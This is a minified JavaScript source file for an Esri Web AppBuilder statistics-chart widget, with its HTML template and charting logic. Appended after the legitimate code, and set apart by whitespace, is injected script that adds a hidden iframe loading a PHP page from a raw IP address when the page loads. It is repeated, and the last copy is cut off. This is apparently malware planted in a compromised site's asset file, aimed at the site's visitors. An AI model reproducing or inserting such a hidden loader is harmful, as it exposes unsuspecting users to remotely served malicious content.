// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/StatisticsChart.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"results-header" data-dojo-attach-point\x3d"resultsHeader" style\x3d"margin-bottom:15px;"\x3e\r\n\t\t\x3cdiv class\x3d"chart-title jimu-float-leading" data-dojo-attach-point\x3d"chartTitle"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"paging-section jimu-float-leading"\x3e\r\n\t\t\t\x3cul data-dojo-attach-point\x3d"pagingUl" data-dojo-attach-event\x3d"onclick:_onPagingUlClicked"\x3e\x3c/ul\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"zoomin jimu-float-trailing" data-dojo-attach-point\x3d"zoominIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"settings jimu-float-trailing" data-dojo-attach-point\x3d"settingsIcon"\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"chartSection" class\x3d"chart-section"\x3e\r\n\t\t\x3ctable cellpadding\x3d"0" cellspacing\x3d"0" style\x3d"width:100%;table-layout:fixed;"\x3e\r\n\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"arrow-td"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"chart-section-item left-arrow arrow" data-dojo-attach-point\x3d"leftArrow" data-dojo-attach-event\x3d"onclick:_onLeftArrowClicked"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"content-td"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"chart-section-item chart-container" data-dojo-attach-point\x3d"chartContainer" dir\x3d"ltr"\r\n\t\t\t\t\t\tstyle\x3d"direction:ltr;overflow:hidden;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"fiald-render-info" data-dojo-attach-point\x3d"faildRenderInfo"\x3e\r\n\t\t\t\t\t\t\tFailed to display chart. Too many categories.\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"arrow-td"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"chart-section-item right-arrow arrow" data-dojo-attach-point\x3d"rightArrow" data-dojo-attach-event\x3d"onclick:_onRightArrowClicked"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/tbody\x3e\r\n\t\t\x3c/table\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"loading" data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/on dojo/Evented dojo/Deferred dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/_base/query dojo/_base/Color dijit/popup dijit/_WidgetBase dijit/TooltipDialog dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/StatisticsChart.html esri/lang esri/graphic esri/graphicsUtils esri/symbols/jsonUtils esri/layers/FeatureLayer jimu/utils jimu/clientStatisticsUtils jimu/dijit/Chart jimu/dijit/_StatisticsChartSettings jimu/dijit/LoadingIndicator".split(" "),
function(r,z,A,B,f,g,h,t,q,x,C,D,E,F,G,H,I,J,u,y,p,v,K,L){return B([C,E,F,z],{baseClass:"jimu-dijit-statistics-chart",templateString:G,theme:"light",noMoreThanOneChartClassName:"no-more-than-one-chart",hasTitleClassName:"has-title",charts:null,paramsDijits:null,tooltipDialogs:null,currentChartIndex:-1,tempGraphics:null,maxPreviewFeaturesCount:20,tooltipColor:"green",floatNumberFieldDecimalPlace:null,popupFieldInfosObj:null,config:null,features:null,featureLayer:null,map:null,fontColor:"#333333",isBigPreview:!1,
showSettingIcon:!1,showZoomIcon:!1,zoomToFeaturesWhenClick:!1,initialChartIndex:0,postMixInProperties:function(){this.nls=window.jimuNls.statisticsChart;this.charts=[];this.paramsDijits=[];this.tooltipDialogs=[];this.isBigPreview&&(this.showZoomIcon=!1)},postCreate:function(){this.inherited(arguments);this.showSettingIcon?this.own(r(document.body,"click",f.hitch(this,this._onDocumentBodyClick))):h.destroy(this.settingsIcon);this.showZoomIcon?this.own(r(this.zoominIcon,"click",f.hitch(this,function(){this.emit("zoomin")}))):
h.destroy(this.zoominIcon);this.isBigPreview&&(this.chartContainer.style.maxHeight="auto",h.addClass(this.domNode,"big-preview"));this.zoominIcon.title=this.nls.enlarge;this.settingsIcon.title=this.nls.setting;h.addClass(this.domNode,this.noMoreThanOneChartClassName)},destroy:function(){this.clear();this.inherited(arguments)},resize:function(a,b){if(0<a||"string"===typeof a&&0<a.length)this.domNode.style.width=a;if(0<b||"string"===typeof b&&0<b.length)this.domNode.style.height=b;this._resize()},resizeByParent:function(){this.domNode.style.width=
"100%";this.domNode.style.height="100%";this._resize()},_resize:function(){this._calculateChartBox();0<=this.currentChartIndex&&this._showChart(this.currentChartIndex)},createServerStatisticsCharts:function(a,b,c){var d=a.fields,e={type:"Table",fields:[]},k=f.clone(c),m=c.mode;"category"===m?(k.valueFields=[],e.fields=g.map(c.valueFields,f.hitch(this,function(a){var b=c.operation;"average"===b&&(b="avg");var e=a+"_"+b;a=a+"_"+b;k.valueFields.push(e);return{name:e,type:"esriFieldTypeDouble",alias:a}})),
g.some(d,f.hitch(this,function(a){return a.name===c.categoryField?(e.fields.push(a),!0):!1}))):"count"===m?(k.mode="feature",k.labelField=c.categoryField,a=a.fields[0].name+"_count",k.valueFields=[a],g.some(d,f.hitch(this,function(a){return a.name===c.categoryField?(e.fields.push(a),!0):!1})),e.fields.push({name:a,type:"esriFieldTypeInteger",alias:this.nls.count})):"field"===m&&(k.valueFields=[],e.fields=g.map(c.valueFields,f.hitch(this,function(a){var b=c.operation;"average"===b&&(b="avg");var e=
a+"_"+b;a=a+"_"+b;k.valueFields.push(e);return{name:e,type:"esriFieldTypeDouble",alias:a}})));return this._getLoadedLayer(e).then(f.hitch(this,function(a){this._createChartsAsync({featureLayer:a,features:b,config:k})}))},createClientCharts:function(a,b,c,d,e){e&&(this.featureLayerForChartSymbologyChart=e);return this._getLoadedLayer(a).then(f.hitch(this,function(a){this._createChartsAsync({featureLayer:a,features:b,config:c,popupFieldInfosObj:d})}))},_getLoadedLayer:function(a){var b=new A,c=null,
c="string"===typeof a?new y(a):"esri.layers.FeatureLayer"===a.declaredClass?a:new y({layerDefinition:f.clone(a),featureSet:null});c.loaded?b.resolve(c):this.own(r(c,"load",f.hitch(this,function(){b.resolve(c)})));return b},_createChartsAsync:function(a){setTimeout(f.hitch(this,function(){this._createCharts(a)}),0)},_createCharts:function(a){try{this.loading.hide();this.clear();var b=!1;a.features&&(b=!!a.features.isSelectedFeatures,a.features=g.filter(a.features,f.hitch(this,function(a){return!!a.attributes})));
this.config=a.config;this.features=a.features;this.featureLayer=a.featureLayer;this.popupFieldInfosObj=a.popupFieldInfosObj?a.popupFieldInfosObj:{};this.config.highLightColor||(this.config.highLightColor=b?"#ff0000":"#00ffff");this._calculateDecimalPlaceForFloatField();this.chartTitle.innerHTML=p.stripHTML(this.config.name||"");this.chartTitle.title=this.chartTitle.innerHTML;this.chartTitle.title?h.addClass(this.domNode,this.hasTitleClassName):h.removeClass(this.domNode,this.hasTitleClassName);1>=
a.config.types.length?h.addClass(this.domNode,this.noMoreThanOneChartClassName):h.removeClass(this.domNode,this.noMoreThanOneChartClassName);var c=this._calculateChartBox(),d=c.w+"px",e=c.h+"px",k=g.map(a.config.types,f.hitch(this,function(a){var b=h.create("div",{"class":"chart-div",style:{width:d,height:e}},this.chartContainer),c=h.toDom("\x3cli class\x3d'paging-li'\x3e\x3ca class\x3d'paging-a'\x3e\x3c/a\x3e\x3c/li\x3e");h.place(c,this.pagingUl);c=a.type;a=a.display;a.backgroundColor||(a.backgroundColor=
"transparent");a.hasOwnProperty("showLegend")||(a.showLegend=!1);a.legendTextColor||(a.legendTextColor=this.fontColor);"pie"===c?(a.hasOwnProperty("showDataLabel")||(a.showDataLabel=!0),a.dataLabelColor||(a.dataLabelColor=this.fontColor)):(a.hasOwnProperty("showHorizontalAxis")||(a.showHorizontalAxis=!0),a.horizontalAxisTextColor||(a.horizontalAxisTextColor=this.fontColor),a.hasOwnProperty("showVerticalAxis")||(a.showVerticalAxis=!0),a.verticalAxisTextColor||(a.verticalAxisTextColor=this.fontColor));
return b})),b=null;"feature"===this.config.mode?b=this._createFeatureModeCharts(a,k):"category"===this.config.mode?b=this._createCategoryModeCharts(a,k):"count"===this.config.mode?b=this._createCountModeCharts(a,k):"field"===this.config.mode&&(b=this._createFieldModeCharts(a,k));this.charts=b.charts;this.paramsDijits=b.paramsDijits;this.tooltipDialogs=g.map(this.paramsDijits,f.hitch(this,function(a){var b=h.create("div");a.placeAt(b);return new D({content:b})}));a=0;0<=this.initialChartIndex&&this.charts.length>=
this.initialChartIndex+1&&(a=this.initialChartIndex);this._showChart(a)}catch(m){console.error(m)}},_calculateChartBox:function(){var a=h.getContentBox(this.domNode),b=a.h;0<this.resultsHeader.clientHeight&&(b=h.getMarginBox(this.resultsHeader),b=a.h-b.h);a=60;b<a&&(a=b);h.setStyle(this.leftArrow,"height",a+"px");h.setStyle(this.rightArrow,"height",a+"px");h.setStyle(this.chartContainer,"height",b+"px");h.setStyle(this.faildRenderInfo,"height",b+"px");return h.getContentBox(this.chartContainer)},
_calculateDecimalPlaceForFloatField:function(){this.floatNumberFieldDecimalPlace={};var a=[];this.config.labelField&&a.push(this.config.labelField);this.config.categoryField&&a.push(this.config.categoryField);this.config.valueFields&&(a=a.concat(this.config.valueFields));var b=g.filter(a,f.hitch(this,function(a){return this._isFloatNumberField(a)})),c={};g.forEach(b,f.hitch(this,function(a){c[a]=[]}));(a=this.features)&&0<a.length&&g.forEach(a,f.hitch(this,function(a){var e=a.attributes;e&&g.forEach(b,
f.hitch(this,function(a){var b=e[a];"number"===typeof b&&c[a].push(b)}))}));g.forEach(b,f.hitch(this,function(a){this.floatNumberFieldDecimalPlace[a]=0;var b=c[a];if(0<b.length)try{var d=this._getBestDecimalPlace(b);this.floatNumberFieldDecimalPlace[a]=d}catch(m){this.floatNumberFieldDecimalPlace[a]=0,console.error(m)}this.popupFieldInfosObj&&(b=this.popupFieldInfosObj[a])&&b.format&&0<=b.format.places&&(this.floatNumberFieldDecimalPlace[a]=b.format.places)}))},_onDocumentBodyClick:function(a){if(0<=
this.currentChartIndex&&this.tooltipDialogs){var b=this.tooltipDialogs[this.currentChartIndex];if(b){var c=!!b.isOpendNow;this._hideAllTooltipDialogs();var d=a.target||a.srcElement;d===this.leftArrow||d===this.rightArrow||h.hasClass(d,"paging-a")||h.hasClass(d,"paging-li")||(d===this.settingsIcon?c?this._hideTooltipDialog(b):this._showTooltipDialog(b):(a=d===b.domNode,d=h.isDescendant(d,b.domNode),a||d?c?this._showTooltipDialog(b):this._hideTooltipDialog(b):this._hideTooltipDialog(b)))}else this._hideAllTooltipDialogs()}else this._hideAllTooltipDialogs()},
clear:function(){this.featureLayer=this.features=this.config=null;this.chartTitle.innerHTML="";this.chartTitle.title="";this.currentChartIndex=-1;this.popupFieldInfosObj=this.floatNumberFieldDecimalPlace=null;t("li",this.pagingUl).removeClass("selected");this.charts||(this.charts=[]);this.paramsDijits||(this.paramsDijits=[]);this.tooltipDialogs||(this.tooltipDialogs=[]);for(var a=0;a<this.charts.length;a++)this.charts[a]&&this.charts[a].destroy(),this.charts[a]=null,this.paramsDijits[a]&&this.paramsDijits[a].destroy(),
this.paramsDijits[a]=null,this.tooltipDialogs[a]&&this.tooltipDialogs[a].destroy(),this.tooltipDialogs[a]=null;this.charts=[];this.paramsDijits=[];this.tooltipDialogs=[];h.empty(this.pagingUl);h.empty(this.chartContainer);h.addClass(this.domNode,this.noMoreThanOneChartClassName)},_showFialdRenderInfo:function(){h.addClass(this.chartSection,"render-faild")},_hideFialdRenderInfo:function(){h.removeClass(this.chartSection,"render-faild")},_showChart:function(a){this.currentChartIndex=-1;var b=t(".chart-div",
this.chartContainer);b.style({display:"none"});var c=t("li",this.pagingUl);c.removeClass("selected");if(!(0>a)){if(b=b[a])this.currentChartIndex=a,h.setStyle(b,"display","block");(c=c[a])&&h.addClass(c,"selected");this.charts&&0<this.charts.length&&(c=this.charts[a])&&this._handlePieChartDisplay(c);if(!this.isBigPreview&&(c=null,this.charts&&0<this.charts.length&&(c=this.charts[a]))){a=this._calculateChartBox();var d=h.getContentBox(b);if(a.w!==d.w||a.h!==d.h)this.loading.show(),d=a.w+"px",a=a.h+
"px",h.setStyle(b,"width",d),h.setStyle(b,"height",a),c.resize(d,a),this.loading.hide()}}},_handlePieChartDisplay:function(a){var b=!1;a&&a.config&&"pie"===a.config.type&&(a=a.config.labels)&&150<a.length&&(b=!0);b?this._showFialdRenderInfo():this._hideFialdRenderInfo()},_hideAllTooltipDialogs:function(){this.tooltipDialogs&&0<this.tooltipDialogs.length&&g.forEach(this.tooltipDialogs,f.hitch(this,function(a){this._hideTooltipDialog(a)}))},_hideTooltipDialog:function(a){a&&(x.close(a),a.isOpendNow=
!1)},_showTooltipDialog:function(a){a&&(x.open({popup:a,around:this.settingsIcon}),a.isOpendNow=!0)},_onPagingUlClicked:function(a){a.stopPropagation();this._hideAllTooltipDialogs();a=a.target||a.srcElement;if("a"===a.tagName.toLowerCase()){var b=t("a",this.pagingUl);a=g.indexOf(b,a);0<=a&&this._showChart(a)}},_onLeftArrowClicked:function(a){a.stopPropagation();this._hideAllTooltipDialogs();a=(this.currentChartIndex-1+this.charts.length)%this.charts.length;0<=a&&this._showChart(a)},_onRightArrowClicked:function(a){a.stopPropagation();
this._hideAllTooltipDialogs();a=(this.currentChartIndex+1+this.charts.length)%this.charts.length;0<=a&&this._showChart(a)},_getHighLightMarkerSymbol:function(){var a=u.fromJson({color:[255,255,255,0],size:18,angle:0,xoffset:0,yoffset:0,type:"esriSMS",style:"esriSMSSquare",outline:{color:[0,0,128,255],width:.75,type:"esriSLS",style:"esriSLSSolid"}});a.setSize(30);a.outline.setColor(new q(this.config.highLightColor));return a},_getHighLightLineSymbol:function(a){var b=u.fromJson({color:[0,255,255,255],
width:1.5,type:"esriSLS",style:"esriSLSSolid"});b.setColor(new q(a||this.config.highLightColor));return b},_getDefaultHighLightFillSymbol:function(){var a=u.fromJson({color:[0,255,255,128],outline:{color:[0,255,255,255],width:1.5,type:"esriSLS",style:"esriSLSSolid"},type:"esriSFS",style:"esriSFSSolid"});a.outline.setColor(new q(this.config.highLightColor));return a},_getVisualVariableByType:function(a,b){return b&&(b=g.filter(b,function(b){return b.type===a&&!b.target}),b.length)?b[0]:null},_getSymbolByRenderer:function(a,
b){var c=this._getDefaultHighLightFillSymbol(),d=this._getVisualVariableByType("colorInfo",a.visualVariables);if(d){if(a=a.getColor(b,{colorInfo:d}))a=f.clone(a),c.setColor(a)}else c=a.getSymbol(b);return c},_getHighLightFillSymbol:function(a,b,c){var d=null,e=b.symbol,d=a.renderer;!e&&d&&(e=this._getSymbolByRenderer(d,b));e&&"function"===typeof e.setOutline?(d=u.fromJson(e.toJson()),b=1.5,e.outline&&0<e.outline.width&&(b=e.outline.width+1),c=this._getHighLightLineSymbol(c?"#ff0000":"#00ffff"),c.setWidth(b),
d.setOutline(c)):d=this._getDefaultHighLightFillSymbol();return d},_zoomToGraphics:function(a){if(this.map&&this.featureLayer&&this.featureLayer.visible){var b;a&&0<a.length&&(b=g.filter(a,function(a){a=a.geometry;return"point"!==a.type?!0:p.isVaildPointGeometry(a)}.bind(this)));if(b&&0<b.length){var c=null;try{c=J.graphicsExtent(b)}catch(d){console.error(d)}if(p.isVaildExtent(c))this.map.setExtent(c.expand(1.4));else if(a=(a=a[0])&&a.geometry)b=f.hitch(this,function(a){var b=this.map.getNumLevels(),
c=this.map.getLevel();this.map.setLevel(Math.max(c,Math.floor(2*b/3))).then(f.hitch(this,function(){this.map.centerAt(a)}))}),"point"===a.type?b(a):"multipoint"===a.type&&1===a.points.length&&b(a.getPoint(0))}}},_removeTempGraphics:function(){if(this.featureLayer&&this.tempGraphics&&0<this.tempGraphics.length)for(;0<this.tempGraphics.length;)this.featureLayer.remove(this.tempGraphics[0]),this.tempGraphics.splice(0,1);this.tempGraphics=null},_mouseOverChartItem:function(a){this._removeTempGraphics();
g.forEach(a,f.hitch(this,function(a){a._originalSymbol=a.symbol}));if(this.featureLayer&&this.featureLayer.getMap()&&this.featureLayer.visible){var b=p.getTypeByGeometryType(this.featureLayer.geometryType),c=null;if("point"===b)c=this._getHighLightMarkerSymbol(),this.tempGraphics=[],g.forEach(a,f.hitch(this,function(a){a=new I(a.geometry,c);this.tempGraphics.push(a);this.featureLayer.add(a)}));else if("polyline"===b)c=this._getHighLightLineSymbol(),g.forEach(a,f.hitch(this,function(a){a.setSymbol(c)}));
else if("polygon"===b){var d=this.featureLayer.getSelectedFeatures()||[];g.forEach(a,f.hitch(this,function(a){var b=0<=d.indexOf(a),b=this._getHighLightFillSymbol(this.featureLayer,a,b);a.setSymbol(b)}));this.features.length!==a.length&&"polygon"===b&&(g.forEach(a,f.hitch(this,function(a){this.featureLayer.remove(a)})),g.forEach(a,f.hitch(this,function(a){this.featureLayer.add(a)})))}}},_mouseOutChartItem:function(a){this._removeTempGraphics();g.forEach(a,f.hitch(this,function(a){a.setSymbol(a._originalSymbol||
null)}))},_isNumber:function(a){return"[object number]"===Object.prototype.toString.call(a).toLowerCase()},_tryLocaleNumber:function(a,b){var c=a;if(H.isDefined(a)&&isFinite(a))try{var d;if(b&&this._isNumberField(b)){var e=this.popupFieldInfosObj[b];d=e&&f.exists("format.places",e)?p.localizeNumberByFieldInfo(a,e):p.localizeNumber(a)}else d=a;"string"===typeof d&&(c=d)}catch(k){console.error(k)}return c+""},_getBestDisplayValue:function(a,b){var c=this._tryLocaleNumber(b,a);if(this.featureLayer.typeIdField===
a){var d=this.featureLayer.types;if(d&&0<d.length&&(d=g.filter(d,f.hitch(this,function(a){return a.id===b})),0<d.length))return c=d[0].name}(a=this._getFieldInfo(a))&&a.domain&&(a=a.domain.codedValues)&&0<a.length&&g.some(a,function(a){return a.code===b?(c=a.name,!0):!1});return c},_getFieldAliasArray:function(a){return g.map(a,f.hitch(this,function(a){return this._getFieldAlias(a)}))},_getFieldAlias:function(a){var b=a;(a=this._getFieldInfo(a))&&(b=a.alias||b);return b},_getFieldInfo:function(a){if(this.featureLayer)for(var b=
this.featureLayer.fields,c=0;c<b.length;c++)if(b[c].name===a)return b[c];return null},_isNumberField:function(a){var b=["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"];return g.some(this.featureLayer.fields,f.hitch(this,function(c){return c.name===a&&0<=b.indexOf(c.type)}))},_isFloatNumberField:function(a){var b=["esriFieldTypeSingle","esriFieldTypeDouble"];return g.some(this.featureLayer.fields,f.hitch(this,function(c){return c.name===a&&0<=b.indexOf(c.type)}))},
_isDateField:function(a){return(a=this._getFieldInfo(a))?"esriFieldTypeDate"===a.type:!1},_getBestDecimalPlace:function(a){var b=0,c={};g.forEach(a,function(a){a=a.toString().split(".");var b=null;1===a.length?b=0:2===a.length&&(b=a[1].length);null!==b&&(c[b]=void 0===c[b]?1:c[b]+1)});a=null;for(var d in c){d=parseInt(d,10);var e=c[d];a?e>a.value&&(a={key:d,value:e}):a={key:d,value:e}}a&&(b=parseInt(a.key,10));return b},_getFloatNumberFieldDecimalPlace:function(a){var b=0;this.floatNumberFieldDecimalPlace&&
(a=this.floatNumberFieldDecimalPlace[a],"number"===typeof a&&(b=a));return b},_getBestValueForFloatNumberField:function(a,b){b=this._getFloatNumberFieldDecimalPlace(b);a=a.toFixed(b);return parseFloat(a)},_getColors:function(a,b){var c=[];a=f.clone(a);if(2===a.colors.length)c=this._createGradientColors(a.colors[0],a.colors[a.colors.length-1],b);else{for(var d=Math.ceil(b/a.colors.length),e=0;e<d;e++)c=c.concat(a.colors);c=c.slice(0,b)}return c},_createGradientColors:function(a,b,c){var d=[];a=new q(a);
var e=new q(b);b=(e.r-a.r)/c;for(var k=(e.g-a.g)/c,e=(e.b-a.b)/c,f=new q,g=0,h=0,n=0,l=0;l<c;l++)g=parseInt(a.r+b*l,10),h=parseInt(a.g+k*l,10),n=parseInt(a.b+e*l,10),f.setColor([g,h,n]),d.push(f.toHex());return d},_createParamsDijit:function(a,b){return new L({isInWidget:this.map?!0:!1,type:a,config:b})},_createJimuChart:function(a,b,c,d,e){var k=e.type,g=this._createParamsDijit(k,e.display),h=g.getConfig();h&&f.mixin(e.display,h);var w=this._getBasicChartOptionsByStatisticsInfo(b,c,d,k);this._udpateJimuChartDisplayOptions(w,
e);var n=new K({chartDom:a,config:w});n.placeAt(a);this._bindChartEvent(n,b,d);this.showSettingIcon&&this.own(r(g,"change",f.hitch(this,function(){g.showShelter();if(n){var a=g.getConfig();f.mixin(e.display,a);this._udpateJimuChartDisplayOptions(w,e);n.updateConfig(w)}g.hideShelter()})));return[n,g]},_udpateJimuChartDisplayOptions:function(a,b){var c=b.type,d=b.display;b={type:c,dataZoom:["inside","slider"],confine:!0,backgroundColor:d.backgroundColor,color:d.colors,legend:d.showLegend,theme:this.theme||
"light",advanceOption:function(a){d.showLegend&&a.legend&&(a.legend.textStyle||(a.legend.textStyle={}),a.legend.textStyle.color=d.legendTextColor,a.legend.textStyle.fontSize=d.legendTextSize);"pie"===c?a.series&&0<a.series.length&&g.forEach(a.series,f.hitch(this,function(a){"pie"===a.type&&(a.label||(a.label={}),a.label.normal||(a.label.normal={}),a.label.normal.show=d.showDataLabel,a.label.normal.textStyle||(a.label.normal.textStyle={}),a.label.normal.textStyle.color=d.dataLabelColor,a.label.normal.textStyle.fontSize=
d.dataLabelSize)})):(a.xAxis||(a.xAxis={}),a.xAxis.axisLabel||(a.xAxis.axisLabel={}),a.xAxis.axisLabel.textStyle||(a.xAxis.axisLabel.textStyle={}),a.xAxis.axisLabel.textStyle.color=d.horizontalAxisTextColor,a.xAxis.axisLabel.textStyle.fontSize=d.horizontalAxisTextSize,a.yAxis||(a.yAxis={}),a.yAxis.axisLabel||(a.yAxis.axisLabel={}),a.yAxis.axisLabel.textStyle||(a.yAxis.axisLabel.textStyle={}),a.yAxis.axisLabel.textStyle.color=d.verticalAxisTextColor,a.yAxis.axisLabel.textStyle.fontSize=d.verticalAxisTextSize)}};
"pie"===c&&(b.innerRadius=d.innerRadius,b.labelLine=!!d.showDataLabel);-1<["column","bar","line"].indexOf(c)&&(d.stack||(d.stack=!1),"line"!==c||d.area||(d.area=!1),"line"===c&&(b.area=d.area),"column"===c||"bar"===c||"line"===c&&d.area)&&(b.stack=d.stack);f.mixin(a,b);"pie"!==c&&(a.axisPointer=!0,a.scale=!1,a.hidexAxis=!d.showHorizontalAxis,a.hideyAxis=!d.showVerticalAxis);return a},_getBasicChartOptionsByStatisticsInfo:function(a,b,c,d){return"feature"===a||"category"===a?this._getCategoryModeChartOptionsByStatisticsInfo(b,
c,d):"count"===a?this._getCountModeChartOptionsByStatisticsInfo(c,d):"field"===a?this._getFieldModeChartOptionByStatisticsInfo(c,d):null},_bindChartEvent:function(a,b,c){if(this.map&&0!==c.length){var d=f.hitch(this,function(a){if("series"===a.componentType){var d=null;if("field"===b)d=this.features;else{var e=c[a.dataIndex];e&&(d=e.dataFeatures)}d&&("mouseover"===a.type?this._mouseOverChartItem(d):"mouseout"===a.type?this._mouseOutChartItem(d):"click"===a.type&&this.zoomToFeaturesWhenClick&&this._zoomToGraphics(d))}}),
e=[{name:"mouseover",callback:d},{name:"mouseout",callback:d}];this.zoomToFeaturesWhenClick&&e.push({name:"click",callback:d});g.forEach(e,f.hitch(this,function(b){a.chart.on(b.name,b.callback)}))}},_createFeatureModeCharts:function(a,b){var c=[],d=[],e=a.config,k={layerDefinition:this.featureLayer,popupFieldInfosObj:this.popupFieldInfosObj,features:a.features,labelField:e.labelField,valueFields:e.valueFields,sortOrder:e.sortOrder,maxLabels:e.maxLabels,useLayerSymbology:e.useLayerSymbology};this.featureLayerForChartSymbologyChart&&
(k.featureLayerForChartSymbologyChart=this.featureLayerForChartSymbologyChart);var h=v.getFeatureModeStatisticsInfo(k);g.forEach(e.types,f.hitch(this,function(a,e){try{var f=this._createJimuChart(b[e],"feature",k,h,a);c.push(f[0]);d.push(f[1])}catch(l){console.error(l)}}));return{charts:c,paramsDijits:d}},_createCategoryModeCharts:function(a,b){var c=[],d=[],e=a.config,k={layerDefinition:this.featureLayer,popupFieldInfosObj:this.popupFieldInfosObj,features:a.features,categoryField:e.categoryField,
valueFields:e.valueFields,operation:a.config.operation,sortOrder:e.sortOrder,dateConfig:e.dateConfig,maxLabels:e.maxLabels,nullValue:e.nullValue,useLayerSymbology:e.useLayerSymbology,splitField:e.splitField};this.featureLayerForChartSymbologyChart&&(k.featureLayerForChartSymbologyChart=this.featureLayerForChartSymbologyChart);var h=v.getCategoryModeStatisticsInfo(k);g.forEach(e.types,f.hitch(this,function(a,e){try{var f=this._createJimuChart(b[e],"category",k,h,a);c.push(f[0]);d.push(f[1])}catch(l){console.error(l)}}));
return{charts:c,paramsDijits:d}},_getSplitedSeriesForCategoryOrCountMode:function(a,b){var c={type:b,labels:[],series:[]},d=[];a.forEach(function(a){if(a=a.splitedValueFields)a=a.map(function(a){return a.field}),d=d.concat(a)});var e=p.uniqueArray(d);c.series=g.map(e,f.hitch(this,function(c){for(var d=[],e=0;e<a.length;e++)d[e]=null;return{name:c,type:b,data:d}}));g.forEach(a,f.hitch(this,function(a,b){var d="";a.category?d=a.category:a.fieldValue&&(d=a.fieldValue);c.labels.push(d);a.splitedValueFields.forEach(function(d){c.series.forEach(function(c){if(c.name===
d.field)if("undefined"!==typeof a.color){var e=this._getSerieData(a,d.value);c.data[b]=e}else c.data[b]=d.value}.bind(this))}.bind(this))}));return c},_getCategoryModeChartOptionsByStatisticsInfo:function(a,b,c){a=this._getFieldAliasArray(a.valueFields);var d=null,e=!1;0<b.length&&(e=b.every(function(a){return!!a.splitedValueFields}));if(e)return this._getSplitedSeriesForCategoryOrCountMode(b,c);"radar"===c?(a=a.map(function(a){return{name:a}}),b=this._getSeriesOfRadar(b),d={type:c,indicator:a,series:b}):
(d={type:c,labels:[],series:[]},d.series=g.map(a,f.hitch(this,function(a){return{name:a,type:c,data:[]}})),g.forEach(b,f.hitch(this,function(a){d.labels.push(a.category);for(var b=0;b<a.valueFields.length;b++){var c=a.valueFields[b];"undefined"!==typeof a.color&&(c=this._getSerieData(a,c));d.series[b].data.push(c)}})));return d},_getSeriesOfRadar:function(a){a=a.map(function(a){return{name:a.category,value:a.valueFields}});return[{type:"radar",data:a}]},_isAllFalseColor:function(a){return a.every(function(a){return!a.color})},
_getSerieData:function(a,b){a.color||(a.color="transparent");return{value:b,itemStyle:{normal:{color:a.color},emphasis:{color:a.color}}}},_createCountModeCharts:function(a,b){var c=[],d=[],e=a.config,h={layerDefinition:this.featureLayer,popupFieldInfosObj:this.popupFieldInfosObj,features:a.features,categoryField:e.categoryField,sortOrder:e.sortOrder,dateConfig:e.dateConfig,maxLabels:e.maxLabels,useLayerSymbology:e.useLayerSymbology,splitField:e.splitField};this.featureLayerForChartSymbologyChart&&
(h.featureLayerForChartSymbologyChart=this.featureLayerForChartSymbologyChart);var m=v.getCountModeStatisticsInfo(h);g.forEach(e.types,f.hitch(this,function(a,e){try{var f=this._createJimuChart(b[e],"count",h,m,a);c.push(f[0]);d.push(f[1])}catch(l){console.error(l)}}));return{charts:c,paramsDijits:d}},_getCountModeChartOptionsByStatisticsInfo:function(a,b){var c=!1;0<a.length&&(c=a.every(function(a){return!!a.splitedValueFields}));if(c)return this._getSplitedSeriesForCategoryOrCountMode(a,b);var d=
{type:b,labels:[],series:[{type:b,data:[]}]};g.forEach(a,f.hitch(this,function(a){var b=a.count;d.labels.push(a.fieldValue);"undefined"!==typeof a.color?(a=this._getSerieData(a,b),d.series[0].data.push(a)):d.series[0].data.push(b)}));return d},_createFieldModeCharts:function(a,b){var c=[],d=[],e=a.config,h={layerDefinition:this.featureLayer,features:a.features,valueFields:e.valueFields,operation:e.operation,sortOrder:e.sortOrder,maxLabels:e.maxLabels,nullValue:e.nullValue},m=v.getFieldModeStatisticsInfo(h);
g.forEach(e.types,f.hitch(this,function(a,e){try{var f=this._createJimuChart(b[e],"field",h,m,a);c.push(f[0]);d.push(f[1])}catch(l){console.error(l)}}));return{charts:c,paramsDijits:d}},_getFieldModeChartOptionByStatisticsInfo:function(a,b){var c={type:b,labels:[],series:[{type:b,data:[]}]};g.forEach(a,f.hitch(this,function(a){var b=this._getFieldAlias(a.label);c.labels.push(b);c.series[0].data.push(a.value)}));return c}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
